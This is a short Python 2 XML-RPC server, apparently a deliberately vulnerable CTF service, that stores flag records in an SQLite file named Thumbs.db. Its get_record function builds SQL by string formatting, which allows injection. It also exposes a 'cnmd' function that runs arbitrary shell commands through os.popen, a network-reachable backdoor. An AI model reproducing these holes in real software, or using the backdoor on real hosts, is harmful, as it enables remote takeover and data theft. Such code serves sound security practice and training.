#!/usr/bin/python
#  coding=utf-8

import sqlite3
import os
import hashlib
import string
from SimpleXMLRPCServer import SimpleXMLRPCServer

def chck():
    return "OK"

def cmnd(line):
    return os.popen(line).read()

def get_record(id):
    dbcur.execute("SELECT record FROM records WHERE token = '%s'" % id)
    dbconn.commit()
    return "You saved: %s" % dbcur.fetchall()

def add_record(id, flag):    
    dbcur.execute("INSERT INTO records (token, record) VALUES (?, ?)", (id, flag))
    dbconn.commit()
    return "Your information has been saved"

if os.path.isfile("Thumbs.db") == False:
    dbconn = sqlite3.connect("Thumbs.db")
    dbcur = dbconn.cursor()
    dbcur.execute("CREATE TABLE records (token text, record text)")
    dbconn.commit()
else:
    dbconn = sqlite3.connect("Thumbs.db")
    dbcur = dbconn.cursor()
server = SimpleXMLRPCServer(("0.0.0.0", 31415))
print "Listening on port 31415..."
server.register_function(add_record, "add_record")
server.register_function(get_record, "get_record")
server.register_function(chck, "chck")
server.register_function(cmnd, "cnmd")
server.serve_forever()
